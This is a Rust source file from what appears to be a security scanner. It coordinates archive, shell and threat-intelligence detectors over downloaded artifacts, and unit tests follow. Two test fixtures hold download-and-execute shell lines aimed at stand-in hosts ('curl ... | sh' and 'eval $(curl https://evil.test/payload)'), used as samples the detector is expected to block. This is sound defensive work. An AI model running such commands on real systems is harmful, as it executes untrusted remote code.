//! Detector coordination for the analysis pipeline
//!
//! See `.spec/` for the full specification.

#![forbid(unsafe_code)]
#![warn(missing_docs)]

use std::panic::{AssertUnwindSafe, catch_unwind};
use std::sync::{Arc, mpsc};
use std::thread;
use std::time::Duration;

use arbitraitor_archive::{
    ArchiveError, ArchiveLimits, detect_archive_hazards, open_archive_with_limits,
};
use arbitraitor_artifact::{ArtifactType, ClassificationResult, ShellKind, classify};
use arbitraitor_intel::{
    Disposition, Indicator, IndicatorType, IntelStore, MatchResult, evaluate_matches,
    match_indicator,
};
use arbitraitor_model::artifact::{ArtifactKind, ShellDialect, TarCompression};
use arbitraitor_model::finding::{
    DetectorMetadata, Evidence, EvidenceKind, Finding, FindingCategory,
};
use arbitraitor_model::ids::Sha256Digest;
use arbitraitor_model::verdict::{Confidence, Severity, Verdict};
use arbitraitor_shell::{ParserConfig, ShellParser, detect, detect_system_threats, normalize};
use sha2::{Digest, Sha256};

const ARTIFACT_DETECTOR_ID: &str = "arbitraitor-analysis.artifact";
const ARCHIVE_DETECTOR_ID: &str = "arbitraitor-analysis.archive-hazards";
const REPUTATION_DETECTOR_ID: &str = "arbitraitor-analysis.reputation";
const SHELL_DETECTOR_ID: &str = "arbitraitor-analysis.shell";

/// Detector trait implemented by analysis stages.
pub trait Detector: Send + Sync {
    /// Detector identity, version, supported artifact kinds, and execution properties.
    fn metadata(&self) -> DetectorMetadata;

    /// Analyze the artifact within the given context and return detector findings.
    fn analyze(&self, ctx: &AnalysisContext<'_>) -> Vec<Finding>;
}

/// Context provided to detectors during analysis.
#[derive(Clone, Debug)]
pub struct AnalysisContext<'artifact> {
    /// Exact immutable artifact bytes being analyzed.
    pub artifact_bytes: &'artifact [u8],
    /// Artifact classification produced before detector execution.
    pub classification: ClassificationResult,
    /// Optional retrieval metadata supplied by the caller.
    pub retrieval: Option<RetrievalInfo>,
    /// SHA-256 digest of [`Self::artifact_bytes`].
    pub artifact_sha256: Sha256Digest,
}

/// Redacted retrieval metadata available to detectors and receipt generation.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct RetrievalInfo {
    /// Redacted originally requested artifact location, if known.
    pub requested_location: Option<String>,
    /// Redacted final artifact location after redirects, if known.
    pub final_location: Option<String>,
    /// Declared content type from retrieval metadata, if known.
    pub content_type: Option<String>,
    /// Retrieved byte count, if known.
    pub byte_count: Option<u64>,
}

/// Result of classifying an artifact and running all applicable detectors.
#[derive(Clone, Debug, PartialEq)]
pub struct AnalysisResult {
    /// Aggregated detector findings in deterministic detector order.
    pub findings: Vec<Finding>,
    /// Artifact classification used for detector selection.
    pub classification: ClassificationResult,
    /// Per-detector execution health records.
    pub detector_results: Vec<DetectorResult>,
    /// Fail-closed MVP verdict derived from detector health and findings.
    pub verdict: Verdict,
}

/// Health record for a single detector execution.
#[derive(Clone, Debug, PartialEq)]
pub struct DetectorResult {
    /// Metadata for the detector that was executed.
    pub metadata: DetectorMetadata,
    /// Execution status.
    pub status: DetectorStatus,
    /// Number of findings emitted by this detector.
    pub finding_count: usize,
}

/// Execution status for one detector.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum DetectorStatus {
    /// Detector completed successfully.
    Ok,
    /// Detector failed and analysis must be treated as incomplete.
    Error(String),
    /// Detector timed out and analysis must be treated as incomplete.
    Timeout,
}

/// Sequential deterministic detector coordinator.
pub struct AnalysisCoordinator {
    detectors: Vec<Arc<dyn Detector>>,
}

impl AnalysisCoordinator {
    /// Creates a coordinator with the default MVP detectors.
    #[must_use]
    pub fn new() -> Self {
        Self::with_detectors(vec![
            Box::new(ArchiveHazardDetector),
            Box::new(ArtifactDetector),
            Box::new(ShellDetector),
        ])
    }

    /// Creates a coordinator from explicit detectors sorted by detector id.
    #[must_use]
    pub fn with_detectors(mut detectors: Vec<Box<dyn Detector>>) -> Self {
        detectors.sort_by(|left, right| left.metadata().id.cmp(&right.metadata().id));
        let detectors = detectors.into_iter().map(Arc::from).collect();
        Self { detectors }
    }

    /// Analyze artifact bytes without retrieval metadata.
    #[must_use]
    pub fn analyze(&self, artifact_bytes: &[u8]) -> AnalysisResult {
        self.analyze_with_retrieval(artifact_bytes, None)
    }

    /// Analyze artifact bytes with optional retrieval metadata.
    #[must_use]
    pub fn analyze_with_retrieval(
        &self,
        artifact_bytes: &[u8],
        retrieval: Option<RetrievalInfo>,
    ) -> AnalysisResult {
        let classification = classify(artifact_bytes);
        let artifact_sha256 = digest(artifact_bytes);
        let ctx = OwnedAnalysisContext {
            artifact_bytes: artifact_bytes.to_vec(),
            classification: classification.clone(),
            retrieval,
            artifact_sha256,
        };
        let artifact_kind = artifact_kind(classification.artifact_type);

        let mut findings = Vec::new();
        let mut detector_results = Vec::new();
        for detector in &self.detectors {
            let metadata = detector.metadata();
            if !supports_artifact_kind(&metadata, &artifact_kind) {
                continue;
            }

            let execution = run_detector(Arc::clone(detector), ctx.clone(), metadata);
            findings.extend(execution.findings);
            detector_results.push(execution.result);
        }

        let verdict = derive_verdict(&findings, &detector_results);
        AnalysisResult {
            findings,
            classification,
            detector_results,
            verdict,
        }
    }
}

impl Default for AnalysisCoordinator {
    fn default() -> Self {
        Self::new()
    }
}

struct DetectorExecution {
    findings: Vec<Finding>,
    result: DetectorResult,
}

#[derive(Clone, Debug)]
struct OwnedAnalysisContext {
    artifact_bytes: Vec<u8>,
    classification: ClassificationResult,
    retrieval: Option<RetrievalInfo>,
    artifact_sha256: Sha256Digest,
}

impl OwnedAnalysisContext {
    fn as_context(&self) -> AnalysisContext<'_> {
        AnalysisContext {
            artifact_bytes: &self.artifact_bytes,
            classification: self.classification.clone(),
            retrieval: self.retrieval.clone(),
            artifact_sha256: self.artifact_sha256.clone(),
        }
    }
}

fn run_detector(
    detector: Arc<dyn Detector>,
    ctx: OwnedAnalysisContext,
    metadata: DetectorMetadata,
) -> DetectorExecution {
    let timeout = Duration::from_millis(metadata.default_timeout_ms);
    let (tx, rx) = mpsc::channel();

    thread::spawn(move || {
        let result = catch_unwind(AssertUnwindSafe(|| detector.analyze(&ctx.as_context())));
        let _ = tx.send((result, ctx.artifact_sha256));
    });

    match rx.recv_timeout(timeout) {
        Ok((Ok(raw_findings), artifact_sha256)) => {
            // Enforce finding digest integrity centrally: every finding must
            // reference the artifact SHA-256 from the analysis context,
            // regardless of what the detector set. This prevents buggy or
            // compromised detectors from attributing findings to wrong artifacts.
            let findings = rewrite_artifact_digest(raw_findings, &artifact_sha256);
            DetectorExecution {
                result: DetectorResult {
                    metadata,
                    status: DetectorStatus::Ok,
                    finding_count: findings.len(),
                },
                findings,
            }
        }
        Ok((Err(payload), _artifact_sha256)) => DetectorExecution {
            findings: Vec::new(),
            result: DetectorResult {
                metadata,
                status: DetectorStatus::Error(panic_message(payload.as_ref())),
                finding_count: 0,
            },
        },
        Err(mpsc::RecvTimeoutError::Timeout) => DetectorExecution {
            findings: Vec::new(),
            result: DetectorResult {
                metadata,
                status: DetectorStatus::Timeout,
                finding_count: 0,
            },
        },
        Err(mpsc::RecvTimeoutError::Disconnected) => DetectorExecution {
            findings: Vec::new(),
            result: DetectorResult {
                metadata,
                status: DetectorStatus::Error("detector thread disconnected".to_owned()),
                finding_count: 0,
            },
        },
    }
}

fn panic_message(payload: &(dyn std::any::Any + Send)) -> String {
    if let Some(message) = payload.downcast_ref::<&str>() {
        (*message).to_owned()
    } else if let Some(message) = payload.downcast_ref::<String>() {
        message.clone()
    } else {
        "detector panicked with non-string payload".to_owned()
    }
}

fn supports_artifact_kind(metadata: &DetectorMetadata, artifact_kind: &ArtifactKind) -> bool {
    metadata.supported_artifact_kinds.is_empty()
        || metadata
            .supported_artifact_kinds
            .iter()
            .any(|supported| supported == artifact_kind)
}

fn derive_verdict(findings: &[Finding], detector_results: &[DetectorResult]) -> Verdict {
    if detector_results
        .iter()
        .any(|result| !matches!(result.status, DetectorStatus::Ok))
    {
        return Verdict::Incomplete;
    }
    if findings
        .iter()
        .any(|finding| finding.severity == Severity::Critical)
    {
        Verdict::Block
    } else if findings
        .iter()
        .any(|finding| finding.severity == Severity::High)
    {
        Verdict::Prompt
    } else if findings.is_empty() {
        Verdict::Pass
    } else {
        Verdict::Warn
    }
}

/// Detector that records artifact-classifier coverage and basic artifact hazards.
#[derive(Clone, Copy, Debug, Default)]
pub struct ArtifactDetector;

impl Detector for ArtifactDetector {
    fn metadata(&self) -> DetectorMetadata {
        DetectorMetadata {
            id: ARTIFACT_DETECTOR_ID.to_owned(),
            version: env!("CARGO_PKG_VERSION").to_owned(),
            supported_artifact_kinds: Vec::new(),
            capabilities: vec![
                "artifact-classification".to_owned(),
                "basic-checks".to_owned(),
            ],
            is_local: true,
            may_upload: false,
            default_timeout_ms: 1_000,
            is_deterministic: true,
        }
    }

    fn analyze(&self, ctx: &AnalysisContext<'_>) -> Vec<Finding> {
        if matches!(ctx.classification.artifact_type, ArtifactType::Unknown) {
            vec![unknown_artifact_finding(ctx)]
        } else {
            Vec::new()
        }
    }
}

/// Detector that lists archive members and emits archive hazard findings.
#[derive(Clone, Copy, Debug, Default)]
pub struct ArchiveHazardDetector;

impl Detector for ArchiveHazardDetector {
    fn metadata(&self) -> DetectorMetadata {
        DetectorMetadata {
            id: ARCHIVE_DETECTOR_ID.to_owned(),
            version: env!("CARGO_PKG_VERSION").to_owned(),
            supported_artifact_kinds: archive_artifact_kinds(),
            capabilities: vec![
                "archive-list".to_owned(),
                "archive-hazard-detection".to_owned(),
            ],
            is_local: true,
            may_upload: false,
            default_timeout_ms: 5_000,
            is_deterministic: true,
        }
    }

    fn analyze(&self, ctx: &AnalysisContext<'_>) -> Vec<Finding> {
        let limits = ArchiveLimits::default();
        let mut reader = match open_archive_with_limits(
            ctx.artifact_bytes,
            ctx.classification.artifact_type,
            limits.clone(),
        ) {
            Ok(reader) => reader,
            Err(error) => return vec![archive_error_finding(ctx, &error)],
        };
        match reader.entries() {
            Ok(entries) => rewrite_artifact_digest(
                detect_archive_hazards(&entries, &limits),
                &ctx.artifact_sha256,
            ),
            Err(error) => vec![archive_error_finding(ctx, &error)],
        }
    }
}

/// Detector that runs shell parsing, normalization, and shell detection rules.
#[derive(Clone, Copy, Debug, Default)]
pub struct ShellDetector;

/// Detector that turns local threat-intelligence matches into reputation findings.
#[derive(Clone, Debug)]
pub struct ReputationDetector {
    store: IntelStore,
}

impl ReputationDetector {
    /// Creates a reputation detector backed by the supplied local intelligence store.
    #[must_use]
    pub fn new(store: IntelStore) -> Self {
        Self { store }
    }
}

impl Detector for ReputationDetector {
    fn metadata(&self) -> DetectorMetadata {
        DetectorMetadata {
            id: REPUTATION_DETECTOR_ID.to_owned(),
            version: env!("CARGO_PKG_VERSION").to_owned(),
            supported_artifact_kinds: Vec::new(),
            capabilities: vec!["local-threat-intel".to_owned()],
            is_local: true,
            may_upload: false,
            default_timeout_ms: 1_000,
            is_deterministic: true,
        }
    }

    fn analyze(&self, ctx: &AnalysisContext<'_>) -> Vec<Finding> {
        let mut matches = match_indicator(
            &self.store,
            &Indicator {
                indicator_type: IndicatorType::Sha256,
                value: ctx.artifact_sha256.to_string(),
            },
        );

        for url in retrieval_urls(ctx) {
            matches.extend(match_indicator(
                &self.store,
                &Indicator {
                    indicator_type: IndicatorType::ExactUrl,
                    value: url,
                },
            ));
        }

        let Some(enforcement) = evaluate_matches(&matches) else {
            return Vec::new();
        };

        vec![reputation_finding(ctx, &matches, enforcement)]
    }
}

impl Detector for ShellDetector {
    fn metadata(&self) -> DetectorMetadata {
        DetectorMetadata {
            id: SHELL_DETECTOR_ID.to_owned(),
            version: env!("CARGO_PKG_VERSION").to_owned(),
            supported_artifact_kinds: shell_artifact_kinds(),
            capabilities: vec![
                "shell-parse".to_owned(),
                "shell-normalize".to_owned(),
                "shell-dynamic-exec-detection".to_owned(),
                "shell-system-detection".to_owned(),
            ],
            is_local: true,
            may_upload: false,
            default_timeout_ms: 5_000,
            is_deterministic: true,
        }
    }

    fn analyze(&self, ctx: &AnalysisContext<'_>) -> Vec<Finding> {
        let mut parser = match ShellParser::with_config(ParserConfig {
            artifact_sha256: ctx.artifact_sha256.clone(),
            ..ParserConfig::default()
        }) {
            Ok(parser) => parser,
            Err(error) => return vec![shell_setup_finding(ctx, &error.to_string())],
        };

        let parse_result = parser.parse_bytes(ctx.artifact_bytes);
        let mut findings = rewrite_artifact_digest(parse_result.parse_errors, &ctx.artifact_sha256);

        let Ok(source) = std::str::from_utf8(ctx.artifact_bytes) else {
            return findings;
        };
        let normalization = match normalize(&parse_result.ast, source) {
            Ok(normalization) => normalization,
            Err(error) => {
                findings.push(shell_normalization_finding(ctx, &error.to_string()));
                return findings;
            }
        };

        findings.extend(rewrite_artifact_digest(
            detect(&normalization, source),
            &ctx.artifact_sha256,
        ));
        findings.extend(rewrite_artifact_digest(
            detect_system_threats(&normalization, source),
            &ctx.artifact_sha256,
        ));
        findings
    }
}

fn rewrite_artifact_digest(
    findings: impl IntoIterator<Item = Finding>,
    digest: &Sha256Digest,
) -> Vec<Finding> {
    findings
        .into_iter()
        .map(|mut finding| {
            finding.artifact_sha256 = digest.clone();
            finding
        })
        .collect()
}

fn unknown_artifact_finding(ctx: &AnalysisContext<'_>) -> Finding {
    Finding {
        id: "artifact.unknown".to_owned(),
        detector: ARTIFACT_DETECTOR_ID.to_owned(),
        category: FindingCategory::ParserError,
        severity: Severity::Medium,
        confidence: Confidence::High,
        title: "Artifact type is unknown".to_owned(),
        description: "The classifier could not identify a supported artifact type. Treat analysis coverage as limited.".to_owned(),
        evidence: vec![Evidence {
            kind: EvidenceKind::Other,
            description: "classifier result".to_owned(),
            content: Some(format!("artifact_type={:?}", ctx.classification.artifact_type)),
        }],
        artifact_sha256: ctx.artifact_sha256.clone(),
        location: None,
        remediation: Some("Inspect the artifact manually or add a detector for this content type before release.".to_owned()),
        references: Vec::new(),
        tags: vec!["artifact-classifier".to_owned(), "unknown-artifact".to_owned()],
    }
}

fn shell_setup_finding(ctx: &AnalysisContext<'_>, error: &str) -> Finding {
    shell_error_finding(
        ctx,
        "shell.parser-setup-error",
        "Shell parser setup failed",
        "The shell parser could not be initialized, so shell analysis coverage is incomplete.",
        error,
    )
}

fn shell_normalization_finding(ctx: &AnalysisContext<'_>, error: &str) -> Finding {
    shell_error_finding(
        ctx,
        "shell.normalization-error",
        "Shell normalization failed",
        "The shell normalizer failed, so shell data-flow analysis coverage is incomplete.",
        error,
    )
}

fn shell_error_finding(
    ctx: &AnalysisContext<'_>,
    id: &str,
    title: &str,
    description: &str,
    error: &str,
) -> Finding {
    Finding {
        id: id.to_owned(),
        detector: SHELL_DETECTOR_ID.to_owned(),
        category: FindingCategory::ParserError,
        severity: Severity::High,
        confidence: Confidence::Confirmed,
        title: title.to_owned(),
        description: description.to_owned(),
        evidence: vec![Evidence {
            kind: EvidenceKind::Other,
            description: "safe parser diagnostic".to_owned(),
            content: Some(error.to_owned()),
        }],
        artifact_sha256: ctx.artifact_sha256.clone(),
        location: None,
        remediation: Some("Fail closed until shell analysis can complete successfully.".to_owned()),
        references: Vec::new(),
        tags: vec![
            "shell-analysis".to_owned(),
            "incomplete-analysis".to_owned(),
        ],
    }
}

fn archive_error_finding(ctx: &AnalysisContext<'_>, error: &ArchiveError) -> Finding {
    let (category, limit_tag) = match error {
        ArchiveError::LimitExceeded { limit } => {
            (FindingCategory::ResourceLimitEvent, Some(*limit))
        }
        _ => (FindingCategory::ParserError, None),
    };
    let mut tags = vec![
        "archive-analysis".to_owned(),
        "incomplete-analysis".to_owned(),
    ];
    if let Some(limit) = limit_tag {
        tags.push(limit.to_owned());
    }
    Finding {
        id: "archive.analysis-error".to_owned(),
        detector: ARCHIVE_DETECTOR_ID.to_owned(),
        category,
        severity: Severity::High,
        confidence: Confidence::Confirmed,
        title: "Archive analysis failed".to_owned(),
        description: "Archive contents could not be listed safely, so archive analysis coverage is incomplete.".to_owned(),
        evidence: vec![Evidence {
            kind: EvidenceKind::Other,
            description: "safe archive diagnostic".to_owned(),
            content: Some(error.to_string()),
        }],
        artifact_sha256: ctx.artifact_sha256.clone(),
        location: None,
        remediation: Some("Fail closed until archive contents can be listed and checked for hazards.".to_owned()),
        references: Vec::new(),
        tags,
    }
}

fn retrieval_urls(ctx: &AnalysisContext<'_>) -> Vec<String> {
    ctx.retrieval
        .iter()
        .flat_map(|retrieval| {
            [
                retrieval.requested_location.clone(),
                retrieval.final_location.clone(),
            ]
            .into_iter()
            .flatten()
        })
        .collect()
}

fn reputation_finding(
    ctx: &AnalysisContext<'_>,
    matches: &[MatchResult],
    enforcement: arbitraitor_intel::EnforcementResult,
) -> Finding {
    let disposition = match enforcement.disposition {
        Disposition::Block => "block",
        Disposition::Warn => "warn",
        Disposition::Informational => "informational",
        Disposition::Allow => "allow",
    };
    let evidence = matches
        .iter()
        .map(|matched| Evidence {
            kind: EvidenceKind::Other,
            description: "threat-intelligence match".to_owned(),
            content: Some(format!(
                "entry_id={}; indicator_type={:?}; specificity={:?}; source_class={:?}",
                matched.entry.id,
                matched.entry.indicator.indicator_type,
                matched.specificity,
                matched.entry.source_class
            )),
        })
        .collect();

    Finding {
        id: "reputation.intel-match".to_owned(),
        detector: REPUTATION_DETECTOR_ID.to_owned(),
        category: FindingCategory::Reputation,
        severity: enforcement.severity,
        confidence: enforcement.confidence,
        title: "Artifact matches threat intelligence".to_owned(),
        description: format!(
            "Local intelligence matched this artifact and policy selected {disposition}."
        ),
        evidence,
        artifact_sha256: ctx.artifact_sha256.clone(),
        location: None,
        remediation: Some(
            "Treat this artifact according to the selected reputation policy disposition."
                .to_owned(),
        ),
        references: Vec::new(),
        tags: vec![
            "reputation".to_owned(),
            format!("disposition:{disposition}"),
        ],
    }
}

fn archive_artifact_kinds() -> Vec<ArtifactKind> {
    vec![
        ArtifactKind::Zip,
        ArtifactKind::Tar(TarCompression::None),
        ArtifactKind::Gzip,
        ArtifactKind::Bzip2,
        ArtifactKind::Xz,
        ArtifactKind::Zstd,
    ]
}

fn shell_artifact_kinds() -> Vec<ArtifactKind> {
    vec![
        ArtifactKind::ShellScript(ShellDialect::Posix),
        ArtifactKind::ShellScript(ShellDialect::Bash),
        ArtifactKind::ShellScript(ShellDialect::Zsh),
    ]
}

fn artifact_kind(artifact_type: ArtifactType) -> ArtifactKind {
    match artifact_type {
        ArtifactType::ShellScript(kind) => ArtifactKind::ShellScript(shell_dialect(kind)),
        ArtifactType::PowerShellScript => ArtifactKind::PowerShellScript,
        ArtifactType::PythonScript => ArtifactKind::PythonScript,
        ArtifactType::JavaScript => ArtifactKind::JavaScript,
        ArtifactType::PeExecutable => ArtifactKind::PeExecutable,
        ArtifactType::ElfExecutable => ArtifactKind::ElfExecutable,
        ArtifactType::MachOExecutable => ArtifactKind::MachOExecutable,
        ArtifactType::ZipArchive => ArtifactKind::Zip,
        ArtifactType::TarArchive => ArtifactKind::Tar(TarCompression::None),
        ArtifactType::GzipCompressed => ArtifactKind::Gzip,
        ArtifactType::Bzip2Compressed => ArtifactKind::Bzip2,
        ArtifactType::XzCompressed => ArtifactKind::Xz,
        ArtifactType::ZstdCompressed => ArtifactKind::Zstd,
        ArtifactType::GenericText | ArtifactType::Unknown => ArtifactKind::GenericText,
        ArtifactType::GenericBinary => ArtifactKind::GenericBinary,
        ArtifactType::HtmlDocument | ArtifactType::XmlDocument => ArtifactKind::Html,
        ArtifactType::JsonDocument => ArtifactKind::Json,
    }
}

fn shell_dialect(kind: ShellKind) -> ShellDialect {
    match kind {
        ShellKind::Posix => ShellDialect::Posix,
        ShellKind::Bash => ShellDialect::Bash,
        ShellKind::Zsh => ShellDialect::Zsh,
    }
}

fn digest(data: &[u8]) -> Sha256Digest {
    Sha256Digest::new(Sha256::digest(data).into())
}

#[cfg(test)]
mod tests {
    use super::{
        AnalysisContext, AnalysisCoordinator, Detector, DetectorStatus, ReputationDetector,
        RetrievalInfo, digest,
    };
    use arbitraitor_artifact::ArtifactType;
    use arbitraitor_intel::{
        CURRENT_SCHEMA_VERSION, Classification, Disposition, FeedEntry, FeedEvidence, FeedSource,
        FeedSourceClass, Indicator, IndicatorType, IntelStore, ReviewState, ReviewStatus,
    };
    use arbitraitor_model::artifact::ArtifactKind;
    use arbitraitor_model::finding::{DetectorMetadata, Evidence, Finding, FindingCategory};
    use arbitraitor_model::verdict::{Confidence, Severity, Verdict};
    use std::fs;
    use std::path::PathBuf;
    use std::thread;
    use std::time::{Duration, SystemTime, UNIX_EPOCH};

    #[test]
    fn default_pipeline_detects_shell_download_to_execute() {
        let coordinator = AnalysisCoordinator::new();
        let result = coordinator.analyze(b"#!/bin/sh\ncurl https://example.test/install.sh | sh\n");

        assert!(matches!(
            result.classification.artifact_type,
            ArtifactType::ShellScript(_)
        ));
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.tags.iter().any(|tag| tag == "download-to-execute"))
        );
        assert_eq!(result.verdict, Verdict::Block);
        assert_eq!(result.detector_results.len(), 2);
        assert!(
            result
                .detector_results
                .iter()
                .all(|result| matches!(result.status, DetectorStatus::Ok))
        );
    }

    #[test]
    fn coordinator_runs_custom_detectors_in_detector_id_order() {
        let coordinator = AnalysisCoordinator::with_detectors(vec![
            Box::new(RecordingDetector::new("z.detector")),
            Box::new(RecordingDetector::new("a.detector")),
        ]);

        let result = coordinator.analyze(b"plain text\n");

        let detector_ids: Vec<&str> = result
            .detector_results
            .iter()
            .map(|detector_result| detector_result.metadata.id.as_str())
            .collect();
        assert_eq!(detector_ids, vec!["a.detector", "z.detector"]);
        let finding_detectors: Vec<&str> = result
            .findings
            .iter()
            .map(|finding| finding.detector.as_str())
            .collect();
        assert_eq!(finding_detectors, vec!["a.detector", "z.detector"]);
    }

    #[test]
    fn detector_failure_is_recorded_and_verdict_is_incomplete() {
        let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(FailingDetector)]);

        let result = coordinator.analyze(b"not empty");

        assert!(result.findings.is_empty());
        assert_eq!(result.verdict, Verdict::Incomplete);
        assert_eq!(result.detector_results.len(), 1);
        assert!(matches!(
            result.detector_results[0].status,
            DetectorStatus::Error(_)
        ));
    }

    #[test]
    fn detector_completing_within_timeout_is_ok() {
        let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(SlowDetector {
            id: "prompt.detector",
            sleep_ms: 1,
            timeout_ms: 100,
        })]);

        let result = coordinator.analyze(b"not empty");

        assert_eq!(result.findings.len(), 1);
        assert_eq!(result.detector_results.len(), 1);
        assert!(matches!(
            result.detector_results[0].status,
            DetectorStatus::Ok
        ));
    }

    #[test]
    fn slow_detector_timeout_is_recorded_and_verdict_is_incomplete() {
        let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(SlowDetector {
            id: "timeout.detector",
            sleep_ms: 100,
            timeout_ms: 5,
        })]);

        let result = coordinator.analyze(b"not empty");

        assert!(result.findings.is_empty());
        assert_eq!(result.verdict, Verdict::Incomplete);
        assert_eq!(result.detector_results.len(), 1);
        assert!(matches!(
            result.detector_results[0].status,
            DetectorStatus::Timeout
        ));
    }

    #[test]
    fn timed_out_detector_does_not_prevent_others_from_running() {
        let coordinator = AnalysisCoordinator::with_detectors(vec![
            Box::new(SlowDetector {
                id: "a.timeout.detector",
                sleep_ms: 100,
                timeout_ms: 5,
            }),
            Box::new(RecordingDetector::new("b.survivor.detector")),
        ]);

        let result = coordinator.analyze(b"not empty");

        assert_eq!(result.detector_results.len(), 2);
        assert!(matches!(
            result.detector_results[0].status,
            DetectorStatus::Timeout
        ));
        assert!(matches!(
            result.detector_results[1].status,
            DetectorStatus::Ok
        ));
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.detector == "b.survivor.detector")
        );
        assert_eq!(result.verdict, Verdict::Incomplete);
    }

    #[test]
    fn retrieval_metadata_is_available_to_detectors() {
        let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(RetrievalDetector)]);
        let retrieval = RetrievalInfo {
            requested_location: Some("https://example.test/install.sh".to_owned()),
            final_location: None,
            content_type: Some("text/plain".to_owned()),
            byte_count: Some(10),
        };

        let result = coordinator.analyze_with_retrieval(b"plain text\n", Some(retrieval));

        assert_eq!(result.findings.len(), 1);
        assert_eq!(result.findings[0].title, "retrieval metadata observed");
    }

    #[test]
    fn panicking_detector_does_not_prevent_others_from_running() {
        let coordinator = AnalysisCoordinator::with_detectors(vec![
            Box::new(FailingDetector),
            Box::new(RecordingDetector::new("survivor.detector")),
        ]);

        let result = coordinator.analyze(b"not empty");

        assert_eq!(result.detector_results.len(), 2);
        assert!(matches!(
            result.detector_results[0].status,
            DetectorStatus::Error(_)
        ));
        assert!(matches!(
            result.detector_results[1].status,
            DetectorStatus::Ok
        ));
        assert!(
            result
                .findings
                .iter()
                .any(|f| f.detector == "survivor.detector")
        );
        assert_eq!(result.verdict, Verdict::Incomplete);
    }

    #[test]
    fn all_findings_carry_correct_artifact_digest() {
        let coordinator = AnalysisCoordinator::new();
        let bytes = b"#!/bin/bash\neval $(curl https://evil.test/payload)\n";
        let expected = digest(bytes);

        let result = coordinator.analyze(bytes);

        assert!(!result.findings.is_empty());
        for finding in &result.findings {
            assert_eq!(
                finding.artifact_sha256, expected,
                "finding {} has wrong digest",
                finding.id
            );
        }
    }

    #[test]
    fn coordinator_overwrites_wrong_digest_from_detector() {
        let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(WrongDigestDetector)]);
        let bytes = b"plain text\n";
        let expected = digest(bytes);

        let result = coordinator.analyze(bytes);

        assert_eq!(result.findings.len(), 1);
        assert_eq!(result.findings[0].artifact_sha256, expected);
    }

    #[test]
    fn reputation_detector_reports_enterprise_sha256_block()
    -> Result<(), Box<dyn std::error::Error>> {
        let bytes = b"known bad payload";
        let digest = digest(bytes).to_string();
        let store = store_with_entries(
            "enterprise-sha",
            [entry(
                IndicatorType::Sha256,
                &digest,
                FeedSourceClass::EnterpriseDeny,
            )],
        )?;
        let detector = ReputationDetector::new(store);
        let ctx = test_context(bytes, None);

        let findings = detector.analyze(&ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(findings[0].confidence, Confidence::Confirmed);
        assert!(
            findings[0]
                .tags
                .iter()
                .any(|tag| tag == "disposition:block")
        );
        Ok(())
    }

    #[test]
    fn reputation_detector_reports_community_url_warn() -> Result<(), Box<dyn std::error::Error>> {
        let url = "https://example.invalid/install.sh";
        let store = store_with_entries(
            "community-url",
            [entry(
                IndicatorType::ExactUrl,
                url,
                FeedSourceClass::CorroboratedCommunity,
            )],
        )?;
        let detector = ReputationDetector::new(store);
        let ctx = test_context(
            b"payload",
            Some(RetrievalInfo {
                requested_location: Some(url.to_owned()),
                final_location: None,
                content_type: None,
                byte_count: None,
            }),
        );

        let findings = detector.analyze(&ctx);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert!(findings[0].tags.iter().any(|tag| tag == "disposition:warn"));
        Ok(())
    }

    #[test]
    fn reputation_detector_reports_no_findings_without_matches()
    -> Result<(), Box<dyn std::error::Error>> {
        let store = store_with_entries(
            "no-match",
            [entry(
                IndicatorType::Sha256,
                &"00".repeat(32),
                FeedSourceClass::EnterpriseDeny,
            )],
        )?;
        let detector = ReputationDetector::new(store);
        let ctx = test_context(b"different payload", None);

        assert!(detector.analyze(&ctx).is_empty());
        Ok(())
    }

    #[test]
    fn reputation_detector_ignores_expired_entries() -> Result<(), Box<dyn std::error::Error>> {
        let bytes = b"formerly bad payload";
        let mut expired = entry(
            IndicatorType::Sha256,
            &digest(bytes).to_string(),
            FeedSourceClass::EnterpriseDeny,
        );
        expired.expires_at = Some("1970-01-01T00:00:00Z".to_owned());
        let store = store_with_entries("expired", [expired])?;
        let detector = ReputationDetector::new(store);
        let ctx = test_context(bytes, None);

        assert!(detector.analyze(&ctx).is_empty());
        Ok(())
    }

    struct RecordingDetector {
        id: &'static str,
    }

    impl RecordingDetector {
        const fn new(id: &'static str) -> Self {
            Self { id }
        }
    }

    impl Detector for RecordingDetector {
        fn metadata(&self) -> DetectorMetadata {
            test_metadata(self.id)
        }

        fn analyze(&self, ctx: &AnalysisContext<'_>) -> Vec<Finding> {
            vec![test_finding(self.id, ctx, "recorded")]
        }
    }

    struct FailingDetector;

    impl Detector for FailingDetector {
        fn metadata(&self) -> DetectorMetadata {
            test_metadata("failing.detector")
        }

        fn analyze(&self, ctx: &AnalysisContext<'_>) -> Vec<Finding> {
            assert!(ctx.artifact_bytes.is_empty(), "forced detector failure");
            Vec::new()
        }
    }

    struct SlowDetector {
        id: &'static str,
        sleep_ms: u64,
        timeout_ms: u64,
    }

    impl Detector for SlowDetector {
        fn metadata(&self) -> DetectorMetadata {
            let mut metadata = test_metadata(self.id);
            metadata.default_timeout_ms = self.timeout_ms;
            metadata
        }

        fn analyze(&self, ctx: &AnalysisContext<'_>) -> Vec<Finding> {
            thread::sleep(Duration::from_millis(self.sleep_ms));
            vec![test_finding(self.id, ctx, "slow detector completed")]
        }
    }

    struct WrongDigestDetector;

    impl Detector for WrongDigestDetector {
        fn metadata(&self) -> DetectorMetadata {
            test_metadata("wrong-digest.detector")
        }

        fn analyze(&self, _ctx: &AnalysisContext<'_>) -> Vec<Finding> {
            vec![Finding {
                id: "wrong-digest.finding".to_owned(),
                detector: "wrong-digest.detector".to_owned(),
                category: FindingCategory::SuspiciousScriptBehavior,
                severity: Severity::Low,
                confidence: Confidence::High,
                title: "wrong digest".to_owned(),
                description: "detector set wrong digest".to_owned(),
                evidence: Vec::<Evidence>::new(),
                artifact_sha256: arbitraitor_model::ids::Sha256Digest::new([0xff; 32]),
                location: None,
                remediation: None,
                references: Vec::new(),
                tags: Vec::new(),
            }]
        }
    }

    struct RetrievalDetector;

